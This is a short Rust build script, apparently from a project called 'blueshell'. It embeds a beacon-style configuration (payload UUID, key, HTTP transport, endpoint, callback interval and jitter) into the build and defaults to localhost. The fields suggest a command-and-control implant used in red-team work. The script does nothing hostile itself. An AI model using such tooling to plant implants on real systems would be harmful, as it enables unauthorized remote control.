use std::{env, fs, path::PathBuf};

fn main() {
    println!("cargo:rerun-if-env-changed=BLUESHELL_BUILD_CONFIG");
    let config = env::var("BLUESHELL_BUILD_CONFIG")
        .ok()
        .and_then(|path| fs::read_to_string(path).ok())
        .unwrap_or_else(|| {
            r#"{"payload_uuid":"","key_b64":"","transport":"http","endpoint":"127.0.0.1:80","uri":"/","interval_ms":5000,"jitter_pct":0}"#.to_owned()
        });
    let out = PathBuf::from(env::var_os("OUT_DIR").expect("OUT_DIR"));
    fs::write(out.join("build_config.json"), config).expect("write build config");
}
